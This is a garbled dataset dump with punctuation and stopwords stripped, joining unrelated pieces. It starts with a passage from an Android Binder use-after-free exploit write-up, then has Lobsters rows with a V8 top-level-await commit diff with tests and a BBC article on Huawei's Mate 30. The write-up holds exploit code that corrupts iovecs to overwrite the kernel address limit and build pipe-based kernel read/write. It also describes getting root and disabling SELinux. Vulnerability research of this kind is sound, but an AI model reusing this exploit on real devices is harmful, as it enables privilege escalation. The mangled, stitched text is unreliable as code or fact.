binderthreadpreemptively write byte satisfy first iovecwrite iovec structure binderthread old memory via recvmsg trigger useafterfree unlink corrupt iovec structurecall write socketpair use corrupted iovec corrupt next iovec controlled memory corruptionagain like leak two thread needed parent thread responsible preemptively writing byte data satisfy recvmsg first iovec requesttriggering free binderthreadwriting iovec stack socket waiting data match iovec request via recvmsg child thread responsible corrupting iovec triggering unlink via deletion epoll eventwriting data corrupt proceeding iovec structure parent thread recvmsg call continuesputting together end following code smash parent process addrlimit functionally code however cleaned us jni function define offsetofaddrlimit struct epollevent event event epollin struct iovec iovecarray iovecarraysz int ioveccorruptionpayloadsz int sockfd int bytesent pidt pid memset iovecarray sizeof iovecarray epollctl epfd epollctladd fd event exitwitherror epollctladd failed strerror errno unsigned long ioveccorruptionpayload iovecindxforwq iovlen iovecindxforwq iovbase iovecindxforwq iovlen threadinfo offsetofaddrlimit arb write location iovecindexforwq iovbase arb write size need qword iovecindexforwq iovlen arb write value smash write anywhere ioveccorruptionpayloadsz sizeof ioveccorruptionpayload iovecarray iovecindxforwq iovbase dummypage mutex iovecarray iovecindxforwq iovlen ask one byte since write one byte linked list next iovecarray iovecindxforwq iovbase void linked list prev iovecarray iovecindxforwq iovlen length previous iovec one next one iovecarray iovecindxforwq iovbase void get smashed ioveccorruptionpayload iovecarray iovecindxforwq iovlen socketpair afunix sockstream sockfd exitwitherror socket pair failed strerror errno preemptively satisfy first iovec request write sockfd x exitwitherror write byte failed strerror errno pid fork pid prctl prsetpdeathsig sigkill sleep epollctl epfd epollctldel fd event bytesent write sockfd ioveccorruptionpayload ioveccorruptionpayloadsz bytesent ioveccorruptionpayloadsz exitwitherror child write returned expected bytesent ioveccorruptionpayloadsz exit ioctl fd binderthreadexit null struct msghdr msg msgiov iovecarray msgiovlen iovecarraysz recvmsg sockfd msg msgwaitall arbitrary readwrite helper functionsnow process address limit smashed arbitrary kernel readwrite simple read write syscalls simply writing data want write pipe write calling read end pipe kernel address pipe data arbitrary kernel addressconversely writing data arbitrary kernel address pipe calling read end pipe pipe data arbitrary kernel address boom arbitrary readwrite int kernelrwpipe pipe kernelrwpipe exitwitherror kernel rw pipe failed strerror errno void kernelwrite unsigned long kaddr void data sizet len len exitwitherror readswrites size page result cause issue write kernelrwpipe data len len exitwitherror failed write data kernel write read kernelrwpipe void kaddr len len exitwitherror failed write data kernel read void kernelread unsigned long kaddr void data sizet len len exitwitherror readswrites size page result cause issue write kernelrwpipe void kaddr len len exitwitherror failed read data kernel write read kernelrwpipe data len len exitwitherror failed read data kernel read additional notessome device even vulnerable may fail writev leak call return instead desired usually offset waitqueue incorrect therefore second ioveciovbase nt getting smashed kernel pointer cause call return second request fail since unmapped addressin case extract kernel image version targeting pull proper offset potentially bruteforce conclusiononce kernel readwrite basically game root shell cred patch away samsung device take step disable selinux patch inittask credential every new process launch postexploit automatically launch full privilege samsung device believe possible without extra work due knox mitigation device though additional patch nt issueit worth noting exploit remarkably stable rarely fails usually error kernel panic need run exploit good go make awesome temporary root method people oem locked bootloaders like meoverall thought exploit strategy jann horn maddie stone pretty novel definitely learned lot breaking gave fresh perspective useafterfree demonstrating totally luck ca nt get useful primitive uaf object itselfreferences additional resourcesissue android useafterfree binder driver chromium bug tracker project zero exploitsyzkaller kasan reportbootlin linux kernel source browsercreditjann horn maddie stone exploit code referenced writeup
77,Lobsters,android,Android,Android: Use-After-Free in Binder driver,https://bugs.chromium.org/p/project-zero/issues/detail?id=1942,android useafterfree binder driver,,
78,Lobsters,android,Android,V8 adds support for top-level await,https://chromium.googlesource.com/v8/v8.git/+/0ceee9ad28c21bc4971fb237cf87eb742fc787b8%5E%21/,add support toplevel await,http secexecuteasyncmodule http asrcastscopesh bsrcastscopesh asrcbuiltinsbasetq bsrcbuiltinsbasetq asrcdiagnosticsobjectsdebugcc bsrcdiagnosticsobjectsdebugcc asrcheapfactorycc bsrcheapfactorycc asrcinterpreterbytecodegeneratorcc bsrcinterpreterbytecodegeneratorcc asrcobjectscontextsinlh bsrcobjectscontextsinlh asrcobjectsfunctionkindh bsrcobjectsfunctionkindh asrcparsingparseinfocc bsrcparsingparseinfocc asrcparsingparseinfoh bsrcparsingparseinfoh asrcparsingparserbaseh bsrcparsingparserbaseh asrcparsingparsercc bsrcparsingparsercc btestcctestinterpreterbytecodeexpectationsasyncmodulesgolden atestcctestinterpretergeneratebytecodeexpectationscc btestcctestinterpretergeneratebytecodeexpectationscc atestcctestinterpretertestbytecodegeneratorcc btestcctestinterpretertestbytecodegeneratorcc atestcctesttestmodulescc btestcctesttestmodulescc btestmjsunitharmonymodulesimporttoplevelawaitcyclemjs,toplevelawait add support parsing top level await add support parsing top level await well many test final cl series add support top level await spec http secexecuteasyncmodule bug changeid reviewedon http reviewedby georg neis neis chromiumorg reviewedby adam klein adamk chromiumorg commitqueue joshua litt joshualitt chromiumorg crcommitposition refsheadsmaster diff git asrcastscopesh bsrcastscopesh index asrcastscopesh bsrcastscopesh return isclassmembersinitializerfunction functionkind void setisasyncmodule dcheck ismodule functionkind functionkind kasyncmodule void declarethis astvaluefactory astvaluefactory void declarearguments astvaluefactory astvaluefactory void declaredefaultfunctionvariables astvaluefactory astvaluefactory bool needsprivatenamecontextchainrecalc scope function scope function kind const functionkind functionkind functionkind functionkind int numparameters diff git asrcbuiltinsbasetq bsrcbuiltinsbasetq index asrcbuiltinsbasetq bsrcbuiltinsbasetq boundtargetfunction callable value always passed value calling wrapped function boundthis jsany boundthis jsany sourcetextmodule list value whose element used first argument call wrapped function boundarguments fixedarray diff git asrcdiagnosticsobjectsdebugcc bsrcdiagnosticsobjectsdebugcc index asrcdiagnosticsobjectsdebugcc bsrcdiagnosticsobjectsdebugcc include srcobjectsfieldtypeh include srcobjectsforeigninlh include srcobjectsfreespaceinlh include srcobjectsfunctionkindh include srcobjectshashtableinlh include srcobjectsjsarrayinlh include srcobjectslayoutdescriptorh scopeinfo length scopeinfo info scopeinfo check kind infofunctionkind checkeq kind kmodule infoscopetype modulescope checkeq internal ismodule kind infoscopetype modulescope isapifunction diff git asrcheapfactorycc bsrcheapfactorycc index asrcheapfactorycc bsrcheapfactorycc module setdfsancestorindex module settoplevelcapability rootsundefinedvalue module setflags module setasync false module setasync isasyncmodule code kind module setasyncevaluating false module setasyncparentmodules asyncparentmodules module setpendingasyncdependencies diff git asrcinterpreterbytecodegeneratorcc bsrcinterpreterbytecodegeneratorcc index asrcinterpreterbytecodegeneratorcc bsrcinterpreterbytecodegeneratorcc storeaccumulatorinregister args done callruntime runtime kinlineasyncgeneratorresolve args else dcheck isasyncfunction info literal kind dcheck isasyncfunction info literal kind isasyncmodule info literal kind registerlist args registerallocator newregisterlist builder moveregister generatorobject args generator registerallocationscope registerscope registerlist args registerallocator newregisterlist runtime functionid functionid isasyncfunction info literal kind isasyncgeneratorfunction info literal kind isasyncfunction info literal kind isasyncgeneratorfunction info literal kind isasyncmodule info literal kind runtime kinlineasyncfunctionenter runtime kinlinecreatejsgeneratorobject builder diff git asrcobjectscontextsinlh bsrcobjectscontextsinlh index asrcobjectscontextsinlh bsrcobjectscontextsinlh base isasyncfunction kind asyncgeneratorfunctionmapindex generatorfunctionmapindex else isasyncfunction kind else isasyncfunction kind isasyncmodule kind asyncfunctionmapindex asyncfunctionwithnamemapindex asyncfunctionwithhomeobjectmapindex asyncfunctionwithnameandhomeobjectmapindex diff git asrcobjectsfunctionkindh bsrcobjectsfunctionkindh index asrcobjectsfunctionkindh bsrcobjectsfunctionkindh begin constructable function knormalfunction kmodule kasyncmodule begin class constructor begin base constructor kbaseconstructor inline bool ismodule functionkind kind return kind functionkind kmodule return isinrange kind functionkind kmodule functionkind kasyncmodule inline bool isasyncmodule functionkind kind return kind functionkind kasyncmodule inline bool isasyncgeneratorfunction functionkind kind return asyncfunction case functionkind kmodule return module case functionkind kasyncmodule return asyncmodule case functionkind kclassmembersinitializerfunction return classmembersinitializerfunction case functionkind kdefaultbaseconstructor diff git asrcparsingparseinfocc bsrcparsingparseinfocc index asrcparsingparseinfocc bsrcparsingparseinfocc setallowharmonyoptionalchaining flagharmonyoptionalchaining setallowharmonynullish flagharmonynullish setallowharmonyprivatemethods flagharmonyprivatemethods setallowharmonytoplevelawait flagharmonytoplevelawait parseinfo parseinfo isolate isolate diff git asrcparsingparseinfoh bsrcparsingparseinfoh index asrcparsingparseinfoh bsrcparsingparseinfoh setcollectsourcepositions flagaccessor kallowharmonynullish allowharmonynullish setallowharmonynullish flagaccessor kallowharmonytoplevelawait allowharmonytoplevelawait setallowharmonytoplevelawait undef flagaccessor kisoneshotiife kcollectsourcepositions kallowharmonynullish kallowharmonytoplevelawait input parsing scope analysis diff git asrcparsingparserbaseh bsrcparsingparserbaseh index asrcparsingparserbaseh bsrcparsingparserbaseh allowharmonydynamicimport false allowharmonyimportmeta false allowharmonyprivatemethods false allowharmonytoplevelawait false allowevalcache true pointerbufferreserve variablebufferreserve allowaccessors harmonydynamicimport allowaccessors harmonyimportmeta allowaccessors harmonyprivatemethods allowaccessors harmonytoplevelawait allowaccessors evalcache undef allowaccessors bool allowharmonydynamicimport bool allowharmonyimportmeta bool allowharmonyprivatemethods bool allowharmonytoplevelawait bool allowevalcache token value op peek token isunaryorcountop op return parseunaryorprefixexpression isasyncfunction op token await isasyncfunction allowharmonytoplevelawait ismodule functionstate kind op token await return parseawaitexpression return parsepostfixexpression diff git asrcparsingparsercc bsrcparsingparsercc index asrcparsingparsercc bsrcparsingparsercc setallowharmonynullish info allowharmonynullish setallowharmonyoptionalchaining info allowharmonyoptionalchaining setallowharmonyprivatemethods info allowharmonyprivatemethods setallowharmonytoplevelawait info allowharmonytoplevelawait int feature feature isolate kusecounterfeaturecount feature usecounts feature buildinitialyield knosourceposition kgeneratorfunction bodyadd factory newexpressionstatement initialyield knosourceposition parsemoduleitemlist body allowharmonytoplevelawait first parse statement buffer top level await create inner block rewrite body module async function otherwise merge statement back main body blockt block impl nullblock statementlistt statement pointerbuffer parsemoduleitemlist statement module always initial yield additional suspends ie awaits treat module asyncmodule functionstatesuspendcount scope setisasyncmodule block factory newblock true statement else statementsmergeinto body isasyncmodule scope functionkind impl rewriteasyncfunctionbody body block factory newundefinedliteral knosourceposition else parsemoduleitemlist body haserror module validate scope asmodulescope pendingerrorhandler zone diff git atestcctestinterpreterbytecodeexpectationsasyncmodulesgolden btestcctestinterpreterbytecodeexpectationsasyncmodulesgolden new file mode index devnull btestcctestinterpreterbytecodeexpectationsasyncmodulesgolden autogenerated generatebytecodeexpectations wrap module yes top level yes top level await yes snippet await frame size parameter count bytecode array length bytecodes b switchongeneratorstate r b ldaconstant b star r b mov r r b callruntime runtime kpushmodulecontext r b pushcontext r b mov r closure r b mov r r b invokeintrinsic runtime kasyncfunctionenter r b star r e b stackcheck e b suspendgenerator r r b resumegenerator r r b star r b invokeintrinsic runtime kgeneratorgetresumemode r b switchonsminofeedback b ldar r e b throw b ldar r b return b mov r r b ldar r b mov r context r b ldasmi b star r b mov r r b invokeintrinsic runtime kasyncfunctionawaituncaught r e b suspendgenerator r r b resumegenerator r r b star r b invokeintrinsic runtime kgeneratorgetresumemode r b star r b ldazero b testreferenceequal r b jumpiftrue b ldar r b rethrow b ldaundefined b star r b ldatrue b star r b mov r r b invokeintrinsic runtime kasyncfunctionresolve r b return b star r b createcatchcontext r b star r b ldathehole b setpendingmessage b ldar r b pushcontext r b ldaimmutablecurrentcontextslot b star r b ldatrue b star r b mov r r b invokeintrinsic runtime kasyncfunctionreject r b return constant pool smi smi scopeinfotype smi smi scopeinfotype handler snippet await import foo frame size parameter count bytecode array length bytecodes b switchongeneratorstate r b ldaconstant b star r b mov r r b callruntime runtime kpushmodulecontext r b pushcontext r b mov r closure r b mov r r b invokeintrinsic runtime kasyncfunctionenter r b star r e b stackcheck e b suspendgenerator r r b resumegenerator r r b star r b invokeintrinsic runtime kgeneratorgetresumemode r b switchonsminofeedback b ldar r e b throw b ldar r b return b mov r r b ldar r b mov r context r b ldaconstant b star r b mov r closure r b callruntime runtime kdynamicimportcall r b star r b mov r r b invokeintrinsic runtime kasyncfunctionawaituncaught r e b suspendgenerator r r b resumegenerator r r b star r b invokeintrinsic runtime kgeneratorgetresumemode r b star r b ldazero b testreferenceequal r b jumpiftrue b ldar r b rethrow b ldaundefined b star r b ldatrue b star r b mov r r b invokeintrinsic runtime kasyncfunctionresolve r b return b star r b createcatchcontext r b star r b ldathehole b setpendingmessage b ldar r b pushcontext r b ldaimmutablecurrentcontextslot b star r b ldatrue b star r b mov r r b invokeintrinsic runtime kasyncfunctionreject r b return constant pool smi smi scopeinfotype smi smi onebyteinternalizedstringtype foo scopeinfotype handler snippet await async function foo await foo frame size parameter count bytecode array length bytecodes b switchongeneratorstate r b ldaconstant b star r b mov r r b callruntime runtime kpushmodulecontext r b pushcontext r b mov r closure r b mov r r b invokeintrinsic runtime kasyncfunctionenter r b star r b createclosure b star r e b stackcheck b ldar r e b suspendgenerator r r b resumegenerator r r b star r b invokeintrinsic runtime kgeneratorgetresumemode r b switchonsminofeedback b ldar r e b throw b ldar r b return b mov r r b ldar r b mov r context r b ldasmi b star r b mov r r b invokeintrinsic runtime kasyncfunctionawaituncaught r e b suspendgenerator r r b resumegenerator r r b star r b invokeintrinsic runtime kgeneratorgetresumemode r b star r b ldazero b testreferenceequal r b jumpiftrue b ldar r b rethrow b r b ldaundefined b star r b ldatrue b star r b mov r r b invokeintrinsic runtime kasyncfunctionresolve r b return b star r b createcatchcontext r b star r b ldathehole b setpendingmessage b ldar r b pushcontext r b ldaimmutablecurrentcontextslot b star r b ldatrue b star r b mov r r b invokeintrinsic runtime kasyncfunctionreject r b return constant pool smi smi scopeinfotype sharedfunctioninfotype smi smi scopeinfotype handler snippet import foo bar await import goo frame size parameter count bytecode array length bytecodes b switchongeneratorstate r b ldaconstant b star r b mov r r b callruntime runtime kpushmodulecontext r b pushcontext r b mov r closure r b mov r r b invokeintrinsic runtime kasyncfunctionenter r b star r b ldazero b star r b callruntime runtime kgetmodulenamespace r b star r e b stackcheck b ldar r e b suspendgenerator r r b resumegenerator r r b star r b invokeintrinsic runtime kgeneratorgetresumemode r b switchonsminofeedback b ldar r e b throw b ldar r b return b mov r r b ldar r b mov r context r b ldaconstant b star r b mov r closure r b callruntime runtime kdynamicimportcall r b star r b mov r r b invokeintrinsic runtime kasyncfunctionawaituncaught r e b suspendgenerator r r b resumegenerator r r b star r b invokeintrinsic runtime kgeneratorgetresumemode r b star r b ldazero b testreferenceequal r b jumpiftrue b ldar r b rethrow b ldaundefined b star r b ldatrue b star r b mov r r b invokeintrinsic runtime kasyncfunctionresolve r b return b star r b createcatchcontext r b star r b ldathehole b setpendingmessage b ldar r b pushcontext r b ldaimmutablecurrentcontextslot b star r b ldatrue b star r b mov r r b invokeintrinsic runtime kasyncfunctionreject r b return constant pool smi smi scopeinfotype smi smi onebyteinternalizedstringtype goo scopeinfotype handler diff git atestcctestinterpretergeneratebytecodeexpectationscc btestcctestinterpretergeneratebytecodeexpectationscc index atestcctestinterpretergeneratebytecodeexpectationscc btestcctestinterpretergeneratebytecodeexpectationscc oneshotopt false asynciteration false privatemethods false toplevelawait false verbose false bool validate const bool oneshotopt const return oneshotopt bool asynciteration const return asynciteration bool privatemethods const return privatemethods bool toplevelawait const return toplevelawait bool verbose const return verbose bool suppressruntimeerrors const return baseline verbose std vector std string inputfilenames const return inputfilenames bool oneshotopt bool asynciteration bool privatemethods bool toplevelawait bool verbose std vector std string inputfilenames std string outputfilename optionsasynciteration true else strcmp argv privatemethods optionsprivatemethods true else strcmp argv harmonytoplevelawait optionstoplevelawait true else strcmp argv verbose optionsverbose true else strncmp argv output asynciteration parseboolean linecstr else linecompare private method privatemethods parseboolean linecstr else linecompare top level await toplevelawait parseboolean linecstr else line break else lineempty oneshotopt stream noneshot opt yes asynciteration stream nasync iteration yes privatemethods stream nprivate method yes toplevelawait stream ntop level await yes stream nn optionsprivatemethods flagharmonyprivatemethods true optionstoplevelawait flagharmonytoplevelawait true stream n autogenerated generatebytecodeexpectationsn nn optionsprintheader stream flagharmonyprivatemethods false flagharmonytoplevelawait false bool writeexpectationsfile const std vector std string snippetlist specify name test functionn toplevel process top level code toplevel functionn privatemethods enable harmonyprivatemethods flagn toplevelawait enable await module leveln outputfilenamen specify output file specified output go stdoutn diff git atestcctestinterpretertestbytecodegeneratorcc btestcctestinterpretertestbytecodegeneratorcc index atestcctestinterpretertestbytecodegeneratorcc btestcctestinterpretertestbytecodegeneratorcc loadgolden modulesgolden test asyncmodules bool previoustoplevelawaitflag flagharmonytoplevelawait flagharmonytoplevelawait true initializedignitionhandlescope scope bytecodeexpectationsprinter printer cctest isolate printersetwrap false printersetmodule true printersettoplevel true const char snippet await n await import foo n await n async function foo n await n n foo n import foo bar n await import goo n check comparetexts buildactual printer snippet loadgolden asyncmodulesgolden flagharmonytoplevelawait previoustoplevelawaitflag test supercallandspread initializedignitionhandlescope scope bytecodeexpectationsprinter printer cctest isolate diff git atestcctesttestmodulescc btestcctesttestmodulescc index atestcctesttestmodulescc btestcctesttestmodulescc flagharmonytoplevelawait prevtoplevelawait test moduleevaluationtoplevelawait bool previoustoplevelawaitflagvalue flagharmonytoplevelawait flagharmonytoplevelawait true isolate isolate cctest isolate handlescope scope isolate localcontext env trycatch trycatch isolate const char source await import await import import await auto src source local string sourcetext src scriptorigin origin moduleorigin filejs cctest isolate scriptcompiler source source sourcetext origin local module module scriptcompiler compilemodule isolate source tolocalchecked checkeq module kuninstantiated module getstatus check module instantiatemodule envlocal compilespecifierasmoduleresolvecallback fromjust checkeq module kinstantiated module getstatus local promise promise local promise cast module evaluate envlocal tolocalchecked checkeq module kevaluated module getstatus checkeq promise state promise kfulfilled check promise result isundefined check trycatchhascaught flagharmonytoplevelawait previoustoplevelawaitflagvalue test moduleevaluationtoplevelawaiterror bool previoustoplevelawaitflagvalue flagharmonytoplevelawait flagharmonytoplevelawait true isolate isolate cctest isolate handlescope scope isolate localcontext env const char source await throw boom import await throw boom import import await throw boom auto src source trycatch trycatch isolate local string sourcetext src scriptorigin origin moduleorigin filejs cctest isolate scriptcompiler source source sourcetext origin local module module scriptcompiler compilemodule isolate source tolocalchecked checkeq module kuninstantiated module getstatus check module instantiatemodule envlocal compilespecifierasmoduleresolvecallback fromjust checkeq module kinstantiated module getstatus local promise promise local promise cast module evaluate envlocal tolocalchecked checkeq module kerrored module getstatus checkeq promise state promise krejected check promise result strictequals boom check module getexception strictequals boom todo joshualitt sure might supposed throw async check trycatchhascaught flagharmonytoplevelawait previoustoplevelawaitflagvalue namespace struct dynamicimportdata dynamicimportdata isolate isolate local promise resolver resolver local context context bool shouldresolve isolate isolate shouldresolve shouldresolve resolverreset isolate resolver contextreset isolate context isolate isolate global promise resolver resolver global context context bool shouldresolve void dohostimportmoduledynamically void importdata std uniqueptr dynamicimportdata importdata staticcast dynamicimportdata importdata isolate isolate importdata isolate handlescope handlescope isolate local promise resolver resolver importdata resolverget isolate local context realm importdata contextget isolate context scope contextscope realm importdata shouldresolve resolver resolve realm true isolate tochecked else resolver reject realm boom tochecked maybelocal promise hostimportmoduledynamicallycallbackresolve local context context local scriptormodule referrer local string specifier isolate isolate context getisolate local promise resolver resolver promise resolver new context tolocalchecked dynamicimportdata data new dynamicimportdata isolate resolver context true isolate enqueuemicrotask dohostimportmoduledynamically data return resolver getpromise maybelocal promise hostimportmoduledynamicallycallbackreject local context context local scriptormodule referrer local string specifier isolate isolate context getisolate local promise resolver resolver promise resolver new context tolocalchecked dynamicimportdata data new dynamicimportdata isolate resolver context false isolate enqueuemicrotask dohostimportmoduledynamically data return resolver getpromise namespace test moduleevaluationtoplevelawaitdynamicimport bool previoustoplevelawaitflagvalue flagharmonytoplevelawait bool previousdynamicimportflagvalue flagharmonydynamicimport flagharmonytoplevelawait true flagharmonydynamicimport true isolate isolate cctest isolate handlescope scope isolate isolate setmicrotaskspolicy microtaskspolicy kexplicit isolate sethostimportmoduledynamicallycallback hostimportmoduledynamicallycallbackresolve localcontext env trycatch trycatch isolate const char source await import foo import await import foo import import await import foo auto src source local string sourcetext src scriptorigin origin moduleorigin filejs cctest isolate scriptcompiler source source sourcetext origin local module module scriptcompiler compilemodule isolate source tolocalchecked checkeq module kuninstantiated module getstatus check module instantiatemodule envlocal compilespecifierasmoduleresolvecallback fromjust checkeq module kinstantiated module getstatus local promise promise local promise cast module evaluate envlocal tolocalchecked checkeq module kevaluated module getstatus checkeq promise state promise kpending check trycatchhascaught isolate runmicrotasks checkeq promise state promise kfulfilled flagharmonytoplevelawait previoustoplevelawaitflagvalue flagharmonydynamicimport previousdynamicimportflagvalue test moduleevaluationtoplevelawaitdynamicimporterror bool previoustoplevelawaitflagvalue flagharmonytoplevelawait bool previousdynamicimportflagvalue flagharmonydynamicimport flagharmonytoplevelawait true flagharmonydynamicimport true isolate isolate cctest isolate handlescope scope isolate isolate setmicrotaskspolicy microtaskspolicy kexplicit isolate sethostimportmoduledynamicallycallback hostimportmoduledynamicallycallbackreject localcontext env trycatch trycatch isolate const char source await import foo import await import foo import import await import foo auto src source local string sourcetext src scriptorigin origin moduleorigin filejs cctest isolate scriptcompiler source source sourcetext origin local module module scriptcompiler compilemodule isolate source tolocalchecked checkeq module kuninstantiated module getstatus check module instantiatemodule envlocal compilespecifierasmoduleresolvecallback fromjust checkeq module kinstantiated module getstatus local promise promise local promise cast module evaluate envlocal tolocalchecked checkeq module kevaluated module getstatus checkeq promise state promise kpending check trycatchhascaught isolate runmicrotasks checkeq module kerrored module getstatus checkeq promise state promise krejected check promise result strictequals boom check module getexception strictequals boom check trycatchhascaught flagharmonytoplevelawait previoustoplevelawaitflagvalue flagharmonydynamicimport previousdynamicimportflagvalue anonymous namespace diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file module flag harmonytoplevelawait import diff git new file mode index devnull referenceerror x defined await x diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file module flag harmonytoplevelawait import diff git new file mode index devnull referenceerror ththsths defined ththsths diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file module await x diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file import ththsths diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file await diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file flag harmonytoplevelawait allownativessyntax flag harmonydynamicimport var ran false async function try let x await import abortjs failure unreachable catch e assertequals x defined emessage ran true performmicrotaskcheckpoint asserttrue ran ran false async function try let x await import abortjs failure unreachable catch e assertinstanceof e syntaxerror assertequals requested module modulesskipemptymjs provide export named default emessage ran true performmicrotaskcheckpoint asserttrue ran ran false async function try let x await import nonexistentfilemjs abortjs failure unreachable catch e asserttrue estartswith error reading ran true performmicrotaskcheckpoint asserttrue ran diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file flag harmonytoplevelawait assertequals import import import import diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file flag harmonytoplevelawait assertequals import import import import diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file flag harmonytoplevelawait assertequals import import import import diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file flag harmonytoplevelawait assertequals import import import import diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file flag harmonytoplevelawait assertequals import import import import diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file flag harmonytoplevelawait assertequals import import import import diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file flag harmonytoplevelawait assertequals import import diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file flag harmonytoplevelawait assertequals import import diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file flag allownativessyntax harmonydynamicimport harmonytoplevelawait let promiseresolved false let import mthen promiseresolved true abortjs promise rejected await assertequals promiseresolved true diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file flag harmonydynamicimport harmonytoplevelawait let import let mnamespace await assertequals mnamespacelife diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file flag harmonydynamicimport harmonytoplevelawait let import let await let import let await assertequals assertequals diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file flag harmonydynamicimport harmonytoplevelawait import assertequals mlife diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file flag harmonydynamicimport harmonytoplevelawait import assertequals mlife assertequals mstringlife diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file flag harmonydynamicimport harmonytoplevelawait import assertequals mlife assertequals mstringlife diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file flag harmonytoplevelawait harmonydynamicimport import assertequals diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file flag harmonydynamicimport harmonytoplevelawait import assertequals mlife diff git atestmjsunitharmonymodulesimporttoplevelawaitcyclemjs btestmjsunitharmonymodulesimporttoplevelawaitcyclemjs new file mode index devnull btestmjsunitharmonymodulesimporttoplevelawaitcyclemjs copyright project author right reserved use source code governed bsdstyle license found license file flag harmonytoplevelawait harmonydynamicimport import import import assertsame assertsame assertsame let await import assertsame diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file flag harmonydynamicimport harmonytoplevelawait let ran false let import await mthen assertunreachable e assertequals emessage answer ran true assertequals ran true diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file flag harmonydynamicimport harmonytoplevelawait let ran false try await import assertunreachable catch e assertequals emessage answer ran true assertequals ran true diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file flag harmonydynamicimport harmonytoplevelawait let ran false try await import assertunreachable catch e assertequals emessage answer ran true assertequals ran true diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file import function return diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file import function return diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file typeof function return undefined function return else function return let import await function return diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file typeof function return undefined function return else function return false assertunreachable await function return diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file typeof function return undefined function return else function return diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file import import export diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file let import let mnamespace await export function life return mnamespacelife diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file import function return diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file function return let import await function return diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file function return diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file import export diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file import let import let await export let stringlife export function life return diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file import function return diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file function return let import await function return diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file function return diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file import export diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file import import export function life return export let stringlife diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file import function return diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file function return let import await function return diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file function return diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file let await import export diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file import assertunreachable diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file await import diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file import let await import export diff git new file mode index devnull copyright project author right reserved use source code governed bsdstyle license found license file function sleepingpromise return new promise resolve settimeout resolve export let life await sleepingpromise life await sleepingpromise life await import life diff git index weakref harmonyweakrefs hostgcrequired optionalchaining harmonyoptionalchaining toplevelawait harmonytoplevelawait skippedfeatures set classmethodsprivate classstaticmethodsprivate toplevelawait classstaticmethodsprivate data ospathjoin ospathdirname ospathabspath file data
80,Lobsters,android,Android,Huawei Mate 30 phones launch without Google apps,https://www.bbc.co.uk/news/technology-49754376,huawei mate phone launch without google apps,u blacklist cinema camera,image copyright huawei huawei launched latest smartphones without many apps typically preinstalled android handsetsthe mate mate pro lack youtube google map gmail among softwarethey also feature google play store normal way user outside china install thirdparty software android phonesto address huawei preloaded new alternative apps owna spokesman chinese firm told bbc facebook instagram whatsapp would available via huawei store called huawei app galleryhe added would also way sideload google apps onto handset phone store staff would advise customer although might run smoothly normal image copyright getty image image caption user face learn way round huawei alternative google service issue addressed minute company launch event munich germany briefly today know u ban phone preinstall gm google mobile service core explained firm consumer device chief richard yu forced u use hm huawei mobile service core added firm set aside encourage developer make apps compatible said apps already integrated firm technology name hardware impressive differentiating caters huawei strength commented bryan market research firm idc enough offset lack google service aside diehard customer patience sideload tolerate possible issue maybe trying ride hope eventually get access google service later one invitee launch tweeted video showing two google service refusing work mate u blacklisthuawei world second bestselling smartphone brand past year behind samsungmr yu said company experienced growth demand smartphones januarytoaugust period compared eight month specify figure referred sale shipmentshowever analyst suggest sale started suffer europe u added huawei blacklist prevents many company providing chinese company latest tech image copyright huawei image caption mr yu said demand compay product continues rise spent billion dollar last year building brand worldwide basis key market like western europe able google full support flagship phone massive blow commented ben wood cc insight consultancy although may way work around restriction going difficult get people embrace phone concerned missing apps rely every day issue affect sale china company strong lead rival customer use play store many google service blockedcinema camerahuawei hoping device feature encourage consumer overlook inconvenience face working around u trade banthe phone billed world first second generation handset promising greater power efficiency thus longer battery life model market well potential faster internet speedsmr yu claimed download data faster samsung note time faster fastest phoneshowever dependent 